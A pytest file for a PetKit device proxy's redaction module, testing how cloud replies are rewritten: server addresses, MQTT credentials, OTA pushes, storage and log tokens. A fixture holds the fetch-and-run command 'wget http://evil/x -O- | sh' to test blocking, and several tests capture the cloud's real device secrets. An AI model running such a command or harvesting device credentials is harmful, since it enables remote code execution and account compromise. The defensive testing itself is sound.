"""Tests for petkit_local/http/redact.py — what a proxied cloud reply may contain.

The point of the module is that rules match on SHAPE, not on endpoint, so most
tests here plant the same hostile object at four different depths and assert it
is caught every time: at the top level, nested under `result`, inside a list
element, and inside JSON that arrived encoded as a string (which is how the
heartbeat carries commands).
"""
import json

import pytest

from petkit_local.devices import payloads
from petkit_local.patchers import esp32_ota
from petkit_local.devices.base import Device
from petkit_local.http.redact import (
    RULE_MQTT,
    RULE_OSS_STS,
    RULE_OTA,
    RULE_RCE,
    RULE_LOCALE,
    RULE_SECRET,
    RULE_SERVER,
    RedactionPolicy,
    redact_body,
    redact_mqtt,
)

API_URL = "http://192.0.2.199:8080/6/"
MQTT_HOST = "192.0.2.199"
BUCKET = "https://192.0.2.199:9000"
AES_KEY = "0123456789abcdef"


def _device() -> Device:
    return Device(device_type="t5", petkit_id=10000001, serial_number="SN123", mac="aa:bb")


def _policy(**kw) -> RedactionPolicy:
    base = dict(device=_device(), api_url=API_URL, mqtt_host=MQTT_HOST,
                bucket_endpoint=BUCKET, aes_key=AES_KEY)
    base.update(kw)
    return RedactionPolicy(**base)


def _run(payload, *, endpoint="/6/t5/dev_state_report", policy=None):
    """Redact `payload` and hand back (decoded body, records)."""
    policy = policy or _policy()
    result = redact_body(json.dumps(payload).encode(), endpoint=endpoint, policy=policy)
    return json.loads(result.body), result


# --- placement: the same hostile object, found wherever it hides -------------

RCE = {"user_cmd": {"run_cmd": "wget http://evil/x -O- | sh"}}


@pytest.mark.parametrize("payload,surviving", [
    # top level: nothing is left to return, so the house empty-success is sent
    (RCE, {"result": {}}),
    # nested under an object: the key carrying it is removed
    ({"result": {"cmd": RCE, "keep": 1}}, {"result": {"keep": 1}}),
    # inside a list: the whole element goes, not just the key
    ({"result": [{"time": 1, "cmd": RCE}, {"time": 2}]}, {"result": [{"time": 2}]}),
])
def test_rce_is_caught_at_every_depth(payload, surviving):
    body, result = _run(payload)
    assert body == surviving
    assert [r.rule for r in result.records] == [RULE_RCE]
    assert result.records[0].original == RCE["user_cmd"]["run_cmd"]


def test_rce_inside_a_json_string_drops_the_whole_heartbeat_entry():
    """The real shape: a heartbeat entry whose `content` is an encoded command.

    The entry must disappear entirely rather than survive as a bare timestamp —
    that is what the old `_strip_run_cmd` did for `result[]` and what the
    firmware, which iterates the list, expects.
    """
    payload = {"result": [
        {"time": 1, "content": json.dumps(RCE)},
        {"time": 2, "content": json.dumps({"user_cmd": {"set_state": 1}})},
    ]}
    body, result = _run(payload, endpoint="/6/poll/t5/heartbeat")

    assert [e["time"] for e in body["result"]] == [2]
    assert [r.rule for r in result.records] == [RULE_RCE]


def test_rce_is_a_blocking_rule_and_server_rewrite_is_not():
    """Only attempts are persisted; routine address substitution is not."""
    _, rce = _run(RCE)
    _, srv = _run({"result": {"apiServers": ["https://api-eu.petkt.com/6/"]}})

    assert [r.rule for r in rce.blocked] == [RULE_RCE]
    assert srv.records and srv.blocked == []


def test_block_rce_off_lets_the_command_through():
    body, result = _run({"result": [{"content": json.dumps(RCE)}]},
                        policy=_policy(block_rce=False))
    assert "run_cmd" in json.dumps(body)
    assert result.records == []


# --- server hand-back -------------------------------------------------------

def test_server_fields_are_replaced_wherever_they_appear():
    """The content rule, on an endpoint that is NOT `dev_serverinfo` (that one
    is forced wholesale — see the SERVERINFO_ENDPOINTS tests)."""
    body, result = _run({"result": {
        "apiServers": ["https://api-eu.petkt.com/6/"],
        "ipServers": ["1.2.3.4"],
        "dns": "223.5.5.5",
        "linked": 1,
        "nextTick": 300,
    }}, endpoint="/6/t5/dev_device_info")

    assert body["result"]["apiServers"] == [API_URL]
    assert body["result"]["ipServers"] == []
    assert body["result"]["dns"] == ""
    # Everything we have no opinion about is upstream's, verbatim — that is the
    # data proxy mode exists to collect.
    assert body["result"]["nextTick"] == 300
    assert [r.rule for r in result.records] == [RULE_SERVER]
    assert result.records[0].original["dns"] == "223.5.5.5"


def test_server_fields_are_caught_on_an_unexpected_endpoint():
    """The whole reason the rules are content-keyed rather than endpoint-keyed."""
    body, result = _run({"result": {"stuff": {"apiServers": ["https://petkt.com/6/"]}}},
                        endpoint="/6/t5/dev_device_info")
    assert body["result"]["stuff"]["apiServers"] == [API_URL]
    assert [r.rule for r in result.records] == [RULE_SERVER]


# --- MQTT hand-back ---------------------------------------------------------

ALI = {"result": {"ali": {
    "id": 1, "deviceName": "realdn", "deviceSecret": "realsecret",
    "productKey": "realpk", "iotInstanceId": "realpk",
    "mqttHost": "realpk.iot-as-mqtt.cn-shanghai.aliyuncs.com",
    "regionId": "cn-shanghai",
}}}

FLAT = {"result": {
    "id": 1, "deviceName": "realdn", "deviceSecret": "realsecret",
    "productKey": "realpk", "mqttHost": "realpk.iot-as-mqtt.cn-shanghai.aliyuncs.com",
}}


@pytest.mark.parametrize("payload,dig", [
    (ALI, lambda b: b["result"]["ali"]),
    (FLAT, lambda b: b["result"]),
])
def test_mqtt_credentials_are_replaced_in_both_shapes(payload, dig):
    """One rule keyed on the containing object covers ali-wrapped and flat."""
    device = _device()
    body, result = _run(payload, endpoint="/6/t5/dev_only_iot_device_info",
                        policy=_policy(device=device))

    block = dig(body)
    assert block["mqttHost"] == MQTT_HOST
    assert block["productKey"] == device.mqtt_product_key
    assert block["deviceName"] == device.mqtt_device_name
    assert block["deviceSecret"] == device.mqtt_device_secret
    assert [r.rule for r in result.records] == [RULE_MQTT]


@pytest.mark.parametrize("payload,dig", [
    (ALI, lambda b: b["result"]["ali"]),
    (FLAT, lambda b: b["result"]),
])
def test_proxy_mode_keeps_an_esp32_model_on_http_too(payload, dig):
    """Rewriting PetKit's reply to the device's own key would send a model
    that builds its broker name from it straight to Aliyun, so proxy mode
    hands out the same fixed key our own `dev_iot_device_info` does."""
    device = Device(device_type="t4", petkit_id=400062421, serial_number="SNT4")
    body, _ = _run(payload, endpoint="/6/t4/dev_iot_device_info",
                   policy=_policy(device=device))
    block = dig(body)
    assert block["productKey"] == payloads.HTTP_ONLY_PRODUCT_KEY
    assert block["mqttHost"] == "petkit-local-http.iot-as-mqtt.eu-central-1.aliyuncs.com"
    assert block["deviceSecret"] == device.mqtt_device_secret

    body, _ = _run(payload, endpoint="/6/t4/dev_iot_device_info",
                   policy=_policy(device=device, esp32_http_only=False))
    assert dig(body)["productKey"] == device.mqtt_product_key
    assert dig(body)["mqttHost"] == MQTT_HOST


@pytest.mark.parametrize("payload,dig", [
    (ALI, lambda b: b["result"]["ali"]),
    (FLAT, lambda b: b["result"]),
])
def test_proxy_mode_hands_a_patched_esp32_its_own_broker(payload, dig):
    """Once its firmware trusts our CA, the device's own key is the one whose
    name DNS points here — unless a firmware job needs it on HTTP."""
    device = Device(device_type="t4", petkit_id=400062421, serial_number="SNT4")
    device.config[esp32_ota.STATE_KEY] = {"running": esp32_ota.PATCHED, "job": None}
    body, _ = _run(payload, endpoint="/6/t4/dev_iot_device_info",
                   policy=_policy(device=device))
    assert dig(body)["productKey"] == device.mqtt_product_key

    device.config[esp32_ota.STATE_KEY]["job"] = {"target": "stock", "version": "1.652"}
    body, _ = _run(payload, endpoint="/6/t4/dev_iot_device_info",
                   policy=_policy(device=device))
    assert dig(body)["productKey"] == payloads.HTTP_ONLY_PRODUCT_KEY


def test_mqtt_rule_captures_the_real_aliyun_credentials():
    """The only place they can be learned — the ones the device uses are ours."""
    _, result = _run(ALI, endpoint="/6/t5/dev_only_iot_device_info")

    assert result.captured["mqtt"] == {
        "mqtt_host": "realpk.iot-as-mqtt.cn-shanghai.aliyuncs.com",
        "product_key": "realpk",
        "device_name": "realdn",
        "device_secret": "realsecret",
        "region_id": "cn-shanghai",
        "iot_instance_id": "realpk",
    }


# --- OTA --------------------------------------------------------------------

@pytest.mark.parametrize("endpoint", ["/6/t5/dev_ota_check", "/6/t5/dev_ota_heartbeat"])
def test_ota_endpoints_are_answered_locally(endpoint):
    body, result = _run({"result": [{"url": "http://petkt.com/fw.bin", "md5": "abc"}]},
                        endpoint=endpoint)
    assert body == {"result": {}}
    assert [r.rule for r in result.blocked] == [RULE_OTA]


def test_ota_endpoint_returning_nothing_is_not_recorded():
    """The usual case — a row per poll would drown the table it lives in."""
    body, result = _run({"result": []}, endpoint="/6/t5/dev_ota_check")
    assert body == {"result": {}}
    assert result.records == []


def test_firmware_image_offered_elsewhere_is_dropped():
    body, result = _run({"result": {"update": {"url": "http://petkt.com/fw.bin",
                                               "md5": "abc", "version": "2.0"}}})
    assert body == {"result": {}}
    assert [r.rule for r in result.blocked] == [RULE_OTA]


@pytest.mark.parametrize("payload", [
    # A version string with no artifact behind it — `Device.firmware` and every
    # state report carry exactly this, so it must NOT be treated as an OTA.
    {"result": {"firmware": "1.2.3", "version": "1.2.3"}},
    # A URL with nothing describing an artifact.
    {"result": {"url": "http://petkt.com/help"}},
])
def test_ota_heuristic_does_not_fire_on_ordinary_payloads(payload):
    body, result = _run(payload)
    assert body == payload
    assert result.records == []


def test_block_ota_off_leaves_the_endpoint_alone():
    payload = {"result": [{"url": "http://petkt.com/fw.bin", "md5": "abc"}]}
    body, result = _run(payload, endpoint="/6/t5/dev_ota_check",
                        policy=_policy(block_ota=False))
    assert body == payload
    assert result.records == []


# --- media / STS ------------------------------------------------------------

STS = {"result": {"type": "oci", "capability": [
    {"cycleType": "CLOUD_STORAGE", "primaryParUrl": "https://petkit-oss.aliyuncs.com/",
     "primaryAesKeyStr": "REALKEYREALKEY01", "primaryDomain": "https://petkit-oss.aliyuncs.com/"},
]}}


def test_sts_capability_list_is_replaced_wholesale():
    """Not patched field by field: `capability[]` is the media control plane, and
    a type the user switched off is absent from ours."""
    body, result = _run(STS, endpoint="/6/t5/dev_oss_sts_info_new_v2")

    entries = body["result"]["capability"]
    assert len(entries) == len(_device().CAPABILITY_TYPES)
    assert all(e["primaryParUrl"].startswith(BUCKET) for e in entries)
    assert all(e["primaryAesKeyStr"] == AES_KEY for e in entries)
    assert [r.rule for r in result.records] == [RULE_OSS_STS]


def test_sts_is_captured_even_when_passed_through():
    """`media_to_real_oss` sends the device to PetKit's OSS, but we still learn
    the real payload — that is what the toggle is for."""
    body, result = _run(STS, endpoint="/6/t5/dev_oss_sts_info_new_v2",
                        policy=_policy(media_to_real_oss=True))

    assert body == STS
    assert result.records == []
    assert result.captured["oss_sts"] == STS["result"]["capability"]


def test_sts_is_captured_when_replaced_too():
    _, result = _run(STS, endpoint="/6/t5/dev_oss_sts_info_new_v2")
    assert result.captured["oss_sts"] == STS["result"]["capability"]


# --- secret -----------------------------------------------------------------

def test_the_signup_secret_is_adopted_not_replaced():
    """The rule that makes proxy mode useful at all. The firmware signs every
    request with this secret and PetKit verifies it, so handing the device one
    we invented gets `{"error": {"code": 704}}` on everything. Passing the real
    one through means the DEVICE produces a signature the cloud accepts — no
    need to reproduce the algorithm."""
    device = _device()
    body, result = _run({"result": {"id": device.petkit_id, "signupAt": "1700000000",
                                    "secret": "0123456789abcdef", "sn": "SN123"}},
                        endpoint="/6/t5/dev_signup", policy=_policy(device=device))

    assert body["result"]["secret"] == "0123456789abcdef"      # passed through
    assert result.captured["api_secret"] == "0123456789abcdef"  # and captured
    assert result.records == []                                 # nothing redacted


def test_a_foreign_device_id_is_still_forced_to_ours():
    """Adopting an id we do not know would stop the device resolving against
    the registry entirely."""
    device = _device()
    body, result = _run({"result": {"id": 999, "signupAt": "1700000000",
                                    "secret": "abc", "sn": "OTHER"}},
                        endpoint="/6/t5/dev_signup", policy=_policy(device=device))

    assert body["result"]["id"] == device.petkit_id
    assert body["result"]["secret"] == "abc"
    assert [r.rule for r in result.records] == [RULE_SECRET]


def test_upstream_cannot_overwrite_the_devices_timezone():
    """PetKit's account-side timezone rode in on dev_device_info and the device
    adopted it — `0.0`/`Etc/UTC` over our `2.0`, which is what burns UTC into
    video watermarks. The device has no timezone of its own to fall back on."""
    device = _device()
    device.config["timezone"] = 2.0
    device.config["locale"] = "Europe/Warsaw"

    body, result = _run({"result": {"id": device.petkit_id, "secret": "abc",
                                    "timezone": 0.0, "locale": "Etc/UTC"}},
                        endpoint="/6/t5/dev_device_info", policy=_policy(device=device))

    assert body["result"]["timezone"] == 2.0
    assert body["result"]["locale"] == "Europe/Warsaw"
    assert [r.rule for r in result.records] == [RULE_LOCALE, RULE_LOCALE]
    # routine, not an attempt — it fires on every poll
    assert result.blocked == []


def test_the_locale_rule_never_adds_a_field_that_was_absent():
    device = _device()
    body, result = _run({"result": {"id": device.petkit_id, "secret": "abc"}},
                        endpoint="/6/t5/dev_signup", policy=_policy(device=device))
    assert "timezone" not in body["result"]
    assert "locale" not in body["result"]
    assert result.records == []


def test_the_locale_rule_leaves_another_devices_block_alone():
    """A linked K3's block carries its own fields; rewriting them with the
    parent's would be a new bug, exactly as for `secret`."""
    device = _device()
    body, _ = _run({"result": {"k3Device": {"id": 555, "sn": "K3", "timezone": 0.0}}},
                   endpoint="/6/t5/dev_device_info", policy=_policy(device=device))
    assert body["result"]["k3Device"]["timezone"] == 0.0


def test_the_adopted_secret_is_what_signup_then_hands_out():
    """Persisted on the device, or the next local `dev_signup` would revert it
    to one the cloud rejects and the 704s would come back."""
    device = _device()
    assert device.signing_secret == device.mqtt_device_secret   # before

    device.api_secret = "0123456789abcdef"
    assert device.signing_secret == "0123456789abcdef"
    assert payloads.to_signup(device)["result"]["secret"] == "0123456789abcdef"
    assert payloads.to_device_info(device)["result"]["secret"] == "0123456789abcdef"
    # The broker credential is a DIFFERENT value and must not move with it.
    assert payloads.to_iot_device_info(device, "h")["result"]["ali"]["deviceSecret"] == \
        device.mqtt_device_secret


def test_a_nested_accessory_secret_is_left_alone():
    """A K3 block carries its own `secret`; writing the parent's credential into
    it would be a new bug rather than a fix."""
    payload = {"result": {"k3Device": {"sn": "K3SERIAL", "secret": "k3secret"}}}
    body, result = _run(payload, endpoint="/6/t5/dev_device_info")

    assert body == payload
    assert result.records == []


# --- bodies we cannot read --------------------------------------------------

@pytest.mark.parametrize("raw", [b"<xml/>", b"", b"not json at all", b'"a bare string"', b"42"])
def test_unreadable_bodies_pass_through_byte_for_byte(raw):
    result = redact_body(raw, endpoint="/6/t5/dev_state_report", policy=_policy())
    assert result.body == raw
    assert result.records == []


def test_a_list_of_non_dicts_does_not_raise():
    """The old stripper called `.get()` on every element and blew up on these."""
    payload = {"result": [1, "two", None, [], {"a": 1}]}
    body, result = _run(payload)
    assert body == payload
    assert result.records == []


def test_a_numeric_string_is_not_retyped():
    """Only `{`/`[` bodies are decoded, so `"5"` stays the string it was."""
    payload = {"result": {"code": "5", "arr": "[1, 2]"}}
    body, _ = _run(payload)
    assert body["result"]["code"] == "5"
    assert body["result"]["arr"] == "[1, 2]"


def test_no_device_means_no_substitution_but_rce_still_blocked():
    """Without a registered device there is nothing to substitute — but the
    command must never get through regardless."""
    policy = RedactionPolicy(device=None, api_url=API_URL)
    body, result = _run({"result": {"apiServers": ["https://petkt.com/6/"], "cmd": RCE}},
                        policy=policy)

    assert body["result"]["apiServers"] == ["https://petkt.com/6/"]
    assert "cmd" not in body["result"]
    assert [r.rule for r in result.records] == [RULE_RCE]


# --- the MQTT entry point ---------------------------------------------------

def test_redact_mqtt_applies_the_same_rules():
    raw = json.dumps({"params": {"content": json.dumps(RCE)}}).encode()
    result = redact_mqtt(raw, topic="/sys/pk/dn/thing/service/property/set", policy=_policy())

    assert b"run_cmd" not in result.body
    assert [r.rule for r in result.blocked] == [RULE_RCE]


def test_redact_mqtt_reserialises_compact():
    """A relayed cloud command is republished to the device, whose data-model
    parser drops spaced JSON. `redact_mqtt` re-serialises every frame — even an
    unredacted one — so it must emit compact bytes or a byte-perfect cloud
    scoop is re-spaced on the way through and never actuates."""
    raw = b'{"method":"thing.service.start","params":{"start_action":0}}'
    result = redact_mqtt(raw, topic="/sys/pk/dn/thing/service/start", policy=_policy())
    assert b", " not in result.body and b": " not in result.body
    assert result.body == raw


def test_redact_mqtt_passes_binary_frames_through():
    raw = b"\x00\x01\x02not json"
    result = redact_mqtt(raw, topic="/sys/pk/dn/thing/event/property/post", policy=_policy())
    assert result.body == raw


# --- OTA heuristic: narrow on purpose ---------------------------------------

@pytest.mark.parametrize("payload,why", [
    # dev_discern_pic's real shape (ai/pets.py). Dropping the entry leaves an
    # empty `discern` list and silently breaks face recognition.
    ({"result": {"list": [{"petId": 7, "discern": [
        {"faceId": "abc", "url": "http://host/faces/abc.jpg", "md5": "deadbeef"}]}]}},
     "a face photo is not firmware"),
    # A media listing.
    ({"result": [{"url": "https://host/clip.mp4", "size": 1024}]},
     "a video is not firmware"),
    # An STS capability entry that happens to carry a url+size.
    ({"result": {"capability": [{"cycleType": "fullVideo",
                                 "url": "https://oss/x.ts", "size": 10}]}},
     "an upload target is not firmware"),
    # A signed URL whose query string mentions a .bin.
    ({"result": {"url": "https://host/photo.jpg?name=a.bin", "md5": "x"}},
     "the query string is not the path"),
])
def test_ota_heuristic_leaves_real_payloads_alone(payload, why):
    """A false positive here DELETES a working payload and files a firmware
    push against the cloud that never happened — so the rule is deliberately
    narrow, and the endpoint rule is the real guard."""
    body, result = _run(payload, policy=_policy(media_to_real_oss=True))
    assert body == payload, why
    assert [r.rule for r in result.records if r.rule == RULE_OTA] == [], why


@pytest.mark.parametrize("payload", [
    # Unambiguous key: nothing else has a reason to send one.
    {"result": {"otaUrl": "https://petkt.com/whatever"}},
    # A generic key pointing at something that IS an image, described by a
    # sibling.
    {"result": {"url": "https://petkt.com/fw/t5-2.0.bin", "md5": "deadbeef"}},
    {"result": {"downloadUrl": "https://petkt.com/fw/t5.img", "version": "2.0"}},
])
def test_ota_heuristic_still_catches_a_real_push(payload):
    body, result = _run(payload)
    assert body == {"result": {}}
    assert [r.rule for r in result.blocked] == [RULE_OTA]


def test_an_ota_endpoint_saying_no_update_is_not_an_attempt():
    """`dev_ota_heartbeat` is polled; a row per poll would bury the one time it
    actually offered something."""
    for empty in ({"result": []}, {"result": None}, {"result": [], "error": None}):
        body, result = _run(empty, endpoint="/6/t5/dev_ota_heartbeat")
        assert body == {"result": {}}
        assert result.records == []


# --- captured MQTT credentials ----------------------------------------------

def test_credentials_split_across_objects_are_merged_not_clobbered():
    """The rule matches on `mqttHost` OR the trio, so one reply can trip it
    twice; assigning would let the second match blank out the first."""
    _, result = _run({"result": {
        "ali": {"productKey": "realpk", "deviceName": "realdn",
                "deviceSecret": "realsecret"},
        "zzz": {"mqttHost": "realpk.iot-as-mqtt.example"},
    }}, endpoint="/6/t5/dev_only_iot_device_info")

    captured = result.captured["mqtt"]
    assert captured["mqtt_host"] == "realpk.iot-as-mqtt.example"
    assert captured["product_key"] == "realpk"
    assert captured["device_secret"] == "realsecret"


def test_credentials_merge_in_the_other_order_too():
    _, result = _run({"result": {
        "mqttHost": "realpk.iot-as-mqtt.example",
        "ali": {"productKey": "realpk", "deviceName": "realdn",
                "deviceSecret": "realsecret"},
    }}, endpoint="/6/t5/dev_only_iot_device_info")

    captured = result.captured["mqtt"]
    assert captured["mqtt_host"] == "realpk.iot-as-mqtt.example"
    assert captured["device_secret"] == "realsecret"


def test_a_dropped_result_keeps_the_key_the_firmware_expects():
    """Every endpoint's answer has a `result`; shipping a body without one is a
    shape no device has ever been sent."""
    body, _ = _run({"result": {"otaUrl": "https://petkt.com/fw.bin"}})
    assert body == {"result": {}}


def test_a_zip_firmware_container_still_needs_a_sibling():
    """`.zip` is a common firmware container and a common everything-else, so
    the extension alone is never evidence."""
    plain = {"result": {"url": "https://cdn.petkt.com/sounds/pack.zip"}}
    body, result = _run(plain)
    assert body == plain and result.records == []

    body, result = _run({"result": {"url": "https://petkt.com/fw/t5.zip", "md5": "abc"}})
    assert body == {"result": {}}
    assert [r.rule for r in result.blocked] == [RULE_OTA]


# --- what the real cloud actually does to a taken-over device ---------------
#
# Captured from hardware on 2026-07-27: a T5 whose session was issued by us
# gets HTTP 200 + `{"error": {"code": 704, "msg": "安全校验失败"}}` on every
# session-bearing endpoint. Only the serial-addressed ones (dev_signup,
# dev_only_iot_device_info_v2, dev_video_device_info) answer normally.

REFUSAL = '{"error":{"code":704,"msg":"安全校验失败"}}'.encode()


def test_cloud_error_is_recognised_despite_the_200():
    from petkit_local.http.redact import cloud_error
    err = cloud_error(REFUSAL)
    assert err is not None and err["code"] == 704


@pytest.mark.parametrize("body", [
    b'{"result": {}}', b'{"result": []}', b"not json", b"", b'{"error": "a string"}',
    b'{"error": {"msg": "no code"}}',
])
def test_cloud_error_does_not_fire_on_anything_else(body):
    from petkit_local.http.redact import cloud_error
    assert cloud_error(body) is None


def test_serverinfo_is_forced_to_ours_even_when_upstream_omits_it():
    """The content rule can replace an `apiServers` it finds; it cannot repair an
    answer that has none. A device handed a serverinfo with no server list
    restarts its boot sequence every ~2.4s — observed on hardware."""
    device = _device()
    result = redact_body(REFUSAL, endpoint="/6/t5/dev_serverinfo",
                         policy=_policy(device=device))
    body = json.loads(result.body)

    assert body == payloads.to_serverinfo(device, API_URL)
    assert body["result"]["apiServers"] == [API_URL]
    assert [r.rule for r in result.records] == [RULE_SERVER]


def test_serverinfo_is_forced_even_when_upstream_answers_normally():
    """It is the one endpoint answered from our values whatever came back."""
    body, result = _run({"result": {"apiServers": ["https://api-eu.petkt.com/6/"],
                                    "nextTick": 300, "linked": 1}},
                        endpoint="/6/dev_serverinfo")
    assert body["result"]["apiServers"] == [API_URL]
    assert body["result"]["nextTick"] == 3600  # ours, not upstream's


# --- log upload (privacy) ---------------------------------------------------

def test_the_device_log_is_never_uploaded_to_petkit():
    """Observed on hardware: with a real token the device PUTs `devRun.log` to
    PetKit's OSS. That log is a full request transcript — every URL, this
    add-on's LAN address, the `X-Device` signatures — so it hands the cloud a
    complete picture of the takeover."""
    real_token = {"result": {"type": "ali", "data": {"token": "CAISkgN1q6Ft5B2yfSjIr5qDB86"}}}
    body, result = _run(real_token, endpoint="/6/t5/dev_upload_log_token")

    assert body == {"result": {}}
    assert "CAISkgN" not in json.dumps(body)
    assert [r.rule for r in result.records] == ["log_upload"]
    # Routine housekeeping, not an attempt by the cloud.
    assert result.blocked == []


def test_the_upload_acknowledgement_keeps_the_cloud_s_own_shape():
    """`dev_upload_log` only acknowledges; there is no token in it to withhold.
    It is answered with the bare STRING result the real cloud sends rather than
    the empty object, which is what `handlers/upload_log.py` sends too — the
    firmware was written against that shape."""
    body, result = _run({"result": "success"}, endpoint="/6/t5/dev_upload_log")

    assert body == {"result": "success"}
    assert [r.rule for r in result.records] == ["log_upload"]
    assert result.blocked == []


def test_a_device_that_collects_locally_is_handed_our_bucket_not_petkit_s():
    """Collection on means the guard substitutes OUR token instead of an empty
    result. Upstream's credential is withheld just as completely, and the log
    now comes to us rather than to nobody — the guard is not weakened by it."""
    real_token = {"result": {"type": "ali", "data": {"token": "CAISkgN1q6Ft5B2yfSjIr5qDB86",
                                                    "bucketName": "petkit-storage-binary-prod-eu",
                                                    "endPoint": "oss-eu-central-1.aliyuncs.com"}}}
    policy = _policy()
    policy.device.config["log_upload_enabled"] = True
    policy.bucket_endpoint = "https://192.0.2.199:9000"
    body, result = _run(real_token, endpoint="/6/t5/dev_upload_log_token", policy=policy)

    assert "CAISkgN" not in json.dumps(body)
    assert "aliyuncs.com" not in json.dumps(body)
    data = body["result"]["data"]
    assert f"{data['bucketName']}.{data['endPoint']}" == "192.0.2.199:9000"
    assert [r.rule for r in result.records] == ["log_upload"]
    assert result.blocked == []


def test_collecting_locally_still_declines_when_the_bucket_has_no_address():
    """An install whose Supervisor host-IP lookup failed has no
    `bucket_endpoint` at all. There is nowhere to send the device, so it gets
    the same empty result as with collection off — never upstream's token."""
    real_token = {"result": {"type": "ali", "data": {"token": "CAISkgN1q6Ft5B2"}}}
    policy = _policy()
    policy.device.config["log_upload_enabled"] = True
    policy.bucket_endpoint = ""
    body, result = _run(real_token, endpoint="/6/t5/dev_upload_log_token", policy=policy)

    assert body == {"result": {}}
    assert [r.rule for r in result.records] == ["log_upload"]


def test_the_real_token_is_still_captured_for_study():
    """Withheld from the device, not from us — the token format is exactly the
    sort of thing proxy mode exists to record."""
    real_token = {"result": {"type": "ali", "data": {"token": "CAISkgN1q6Ft5B2"}}}
    _, result = _run(real_token, endpoint="/6/t5/dev_upload_log_token")
    assert result.records[0].original == real_token


def test_log_upload_guard_can_be_switched_off():
    payload = {"result": {"type": "ali", "data": {"token": "CAISkgN1q6Ft5B2"}}}
    body, result = _run(payload, endpoint="/6/t5/dev_upload_log_token",
                        policy=_policy(block_log_upload=False))
    assert body == payload
    assert result.records == []


def test_an_sts_capability_list_and_a_subscription_list_are_not_confused():
    """Both are keyed `capability[]` and they are different things.

    One carries upload credentials (`cycleType`, `primaryParUrl`), the other a
    cloud-storage window (`name`, `indate`). Matching on the key alone had the
    STS rule replace a subscription window with a credential list.
    """
    subscription = {"capability": [{"name": "fullVideo", "workTime": 1, "indate": 2}]}
    out, result = _run(dict(subscription))
    assert out["capability"] == subscription["capability"], "the STS rule ate a subscription"
    assert not result.records


def test_the_cvr_window_is_left_alone_unless_the_toggle_is_on():
    """An expired window from PetKit is a fact about somebody's account, so
    overriding it is a decision rather than a transport detail — off until
    asked for. On, a lapsed subscription stops silently disabling recording."""
    expired = {"capacity": [{"name": "fullVideo", "workTime": 1, "indate": 2}],
               "cloudProduct": {"workIndate": 2, "chargeType": "PAID"}}

    kept, _ = _run(dict(expired))
    assert kept["capacity"] == expired["capacity"]

    swapped, result = _run(dict(expired), policy=_policy(local_cvr_window=True))
    assert swapped["capacity"] != expired["capacity"]
    assert swapped["cloudProduct"]["chargeType"] == "LOCAL"
    assert any(r.rule == RULE_OSS_STS for r in result.records)
